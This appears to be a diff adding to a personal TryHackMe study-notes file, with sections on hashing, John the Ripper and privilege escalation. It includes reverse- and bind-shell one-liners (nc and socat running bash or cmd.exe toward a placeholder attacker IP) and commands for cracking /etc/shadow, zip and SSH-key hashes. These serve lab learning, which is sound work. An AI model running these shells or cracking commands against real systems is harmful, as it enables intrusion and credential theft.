@@ -35,6 +35,8 @@ Web Hacking Fundamentals
 - [Pickle Rick](/tryhackme/pickle_rick.md)
 
 Cryptography
+  - [Hashing - Crypto 101](#hashing---crypto-101)
+  - [John The Ripper](#john-the-ripper)
 
 Windows Exploitation Basics
 - [Metasploit: Introduction](#metasploit-introduction)
@@ -43,6 +45,10 @@ Windows Exploitation Basics
 - [Blue](#blue)
 
 Shells and Privilege Escalation
+  - [What the Shell](#what-the-shell)
+    - [Netcat Shell Stablization](#netcat-shell-stablization)
+    - [Reverse Shell](#reverse-shell)
+    - [Bind Shell](#bind-shell)
 
 Basic Computer Exploitation
 - [Steel Mountain](#steel-mountain)
@@ -332,6 +338,71 @@ cd /var/www
 cat flag.txt
 ```
 > THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
+
+## Hashing - Crypto 101
+- Cryptanalysis : Attacking cryptography by finding a weakness in the underlying maths
+- The salt is randomly generated and stored in the database, unique to each user.
+  | Unix style password prefix  | Description 
+  | -------                     | ----------- 
+  | \$1$                      | md5crypt
+  |  \$2$, \$2a$, \$2b$, \$2x$, \$2y$   | Bcrypt 
+  | \$6$                  | sha512crypt 
+
+## John the Ripper
+- A hash cracking tool
+- Use a hash-identifier `hash-id.py` to find the type of hash
+- `john --format=[format] --wordlist=[path to wordlist] [path to file]`
+- NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".
+- `unshadow [path to passwd] [path to shadow]` crack /etc/shadow passwords
+- In single crack mode, John uses the username to find possible passwords by slightly changing the username.
+  - `john --single --format=[format] [path to file]`
+  - prepend username to hash
+- Custom rules can be defined in the `john.conf` file.
+- `zip2john [options] [zip file] > [output file]`
+- `rar2john [rar file] > [output file]`
+- `ssh2john [id_rsa private key file] > [output file]`
+
+## What the Shell?
+- **Reverse shells** are when the target executes code that connects back to your computer.
+- **Bind shells** are when you execute code that connects to the target computer.
+- Interactive shells allow you to interact with programs after execution.
+- Non-interactive shells do not and make up the majority of simple reverse and bind shells.
+### Netcat Shell Stablization
+1. `python3 -c 'import pty;pty.spawn("/bin/bash")`
+2. `export TERM=xterm`
+3. `stty raw -echo; fg`
+
+### Reverse Shell
+| Linux | Windows 
+| ---------| -------
+| A: `nc -lvnp <port>` | 
+| T: `nc <local-ip> <port> -e /bin/bash` | `nc <local-ip> <port> -e "cmd.exe"`
+| |
+| A: `socat TCP-L:<port> -` |
+| T: `socat TCP:<IP>:<port> EXEC: "bash -li"` | `socat TCP:<IP>:<port> EXEC: powershell.exe, pipes`
+| |
+| A: ``socat TCP-L:<port> FILE: `tty`, raw, echo=0``
+| T: `socat TCP:<IP>:<port> EXEC "bash -li", pty,stderr,sigint,setsid,sane`
+
+### Bind Shell
+| Linux | Windows 
+| ---------| -------
+| T: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f \| /bin/sh >/tmp/f 2>&1; rm /tmp/f` | `nc -lnvp <port> -e "cmd.exe"`
+| A: `nc <IP> <port>` 
+||
+| T: `socat TCP-L:<port> EXEC: "bash -li"` | `socat TCP-L:<port> EXEC: powershell.exe, pipes`
+| A: `socat TCP:<IP>:<port> -`
+
+## Privilege Escalation
+- The exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
+- LinEnum is a bash script that performs common commands related to privilege escalation.
+1. Weak File Permissions
+    - Readable `/etc/shadow`
+    - Writable `/etc/shadow`, `/etc/passwd`
+2. `sudo -l`
+3. Cron Jobs
+4. SUID / SGID Executables
+5. Password and Keys
 
 ## Metasploit: Introduction
 - **Metasploit** is a tool for pentesting, ranging from enumeration to post-exploitation.
